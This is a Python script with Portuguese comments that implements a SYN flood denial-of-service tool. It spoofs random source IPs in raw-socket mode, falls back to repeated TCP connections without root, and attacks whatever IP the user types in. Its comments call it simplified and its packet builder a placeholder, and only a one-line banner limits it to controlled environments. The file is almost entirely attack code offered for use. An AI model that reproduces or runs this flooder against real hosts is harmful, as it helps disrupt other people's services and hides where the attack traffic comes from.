#!/usr/bin/env python3
# tools/syn_flood.py - Versão simplificada para teste

import socket
import threading
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

class SYNFlood:
    def __init__(self, target_ip, target_port=80, threads=10, duration=60):
        """
        Versão simplificada do SYN Flood
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.running = False
        self.packets_sent = 0
        
        # Verificar se é IP ou domínio
        try:
            socket.inet_aton(target_ip)
            self.ip = target_ip
        except socket.error:
            # Se for domínio, resolver
            self.ip = socket.gethostbyname(target_ip)
        
        print(f"{Fore.CYAN}[*] Alvo resolvido: {self.ip}")
        
        # Criar socket
        try:
            # Tentar criar socket raw primeiro
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_mode = True
            print(f"{Fore.GREEN}[✓] Modo RAW ativado (requer root)")
        except PermissionError:
            # Se não tiver root, usar socket normal
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.raw_mode = False
            print(f"{Fore.YELLOW}[!] Modo normal (sem raw). Execute com sudo para melhor performance")
        except Exception as e:
            print(f"{Fore.RED}[!] Erro ao criar socket: {e}")
            raise
    
    def attack_worker_raw(self, thread_id):
        """Trabalhador para modo raw (SYN real)"""
        local_packets = 0
        
        while self.running:
            try:
                # Criar IP de origem falso
                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                src_port = random.randint(1024, 65535)
                
                # Criar pacote SYN simples
                packet = self.create_syn_packet(src_ip, src_port)
                
                # Enviar
                self.sock.sendto(packet, (self.ip, 0))
                
                local_packets += 1
                
                if local_packets % 100 == 0:
                    print(f"{Fore.GREEN}[Thread {thread_id}] {local_packets} pacotes enviados")
                
            except Exception as e:
                print(f"{Fore.RED}[Thread {thread_id}] Erro: {e}")
    
    def attack_worker_normal(self, thread_id):
        """Trabalhador para modo normal (conexões TCP)"""
        local_packets = 0
        
        while self.running:
            try:
                # Tentar conectar
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                result = sock.connect_ex((self.ip, self.target_port))
                
                if result == 0:
                    print(f"{Fore.GREEN}[Thread {thread_id}] Conexão estabelecida")
                else:
                    print(f"{Fore.YELLOW}[Thread {thread_id}] Conexão recusada")
                
                sock.close()
                local_packets += 1
                
            except Exception as e:
                print(f"{Fore.RED}[Thread {thread_id}] Erro: {e}")
            
            time.sleep(0.1)
    
    def create_syn_packet(self, src_ip, src_port):
        """Cria um pacote SYN simples"""
        # Versão simplificada - apenas para demonstração
        # Na prática, você precisaria construir o pacote IP e TCP manualmente
        
        # Simular um pacote (isso não é um SYN real, apenas um placeholder)
        packet = b'\x45\x00\x00\x28' + \
                 random.randint(0, 65535).to_bytes(2, 'big') + \
                 b'\x40\x00\x40\x06' + \
                 b'\x00\x00' + \
                 socket.inet_aton(src_ip) + \
                 socket.inet_aton(self.ip) + \
                 src_port.to_bytes(2, 'big') + \
                 self.target_port.to_bytes(2, 'big') + \
                 b'\x00\x00\x00\x00' + \
                 b'\x00\x00\x00\x00' + \
                 b'\x50\x02\x20\x00' + \
                 b'\x00\x00\x00\x00'
        
        return packet
    
    def start(self):
        """Inicia o ataque"""
        print(f"""
{Fore.RED}╔════════════════════════════════════════╗
║     INICIANDO SYN FLOOD               ║
╠════════════════════════════════════════╣
║ Alvo: {self.ip:<19} ║
║ Porta: {self.target_port:<24} ║
║ Threads: {self.threads:<21} ║
║ Modo: {'RAW' if self.raw_mode else 'NORMAL':<24} ║
║ Duração: {self.duration}s {' ' * 19}║
╚════════════════════════════════════════╝{Style.RESET_ALL}
        """)
        
        self.running = True
        threads = []
        
        # Escolher modo de ataque
        worker = self.attack_worker_raw if self.raw_mode else self.attack_worker_normal
        
        # Criar threads
        for i in range(self.threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitorar
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                print(f"{Fore.CYAN}[⏱️] {elapsed}s decorridos | {remaining}s restantes")
        
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}\n[!] Ataque interrompido")
        
        finally:
            self.stop()
    
    def stop(self):
        """Para o ataque"""
        self.running = False
        if hasattr(self, 'sock'):
            self.sock.close()
        print(f"{Fore.GREEN}[✓] SYN Flood finalizado")

if __name__ == "__main__":
    # Teste rápido
    print(f"{Fore.RED}⚠️  TESTE - APENAS PARA AMBIENTES CONTROLADOS")
    
    target = input("IP alvo: ")
    if target:
        attack = SYNFlood(
            target_ip=target,
            target_port=80,
            threads=5,
            duration=10
        )
        attack.start()
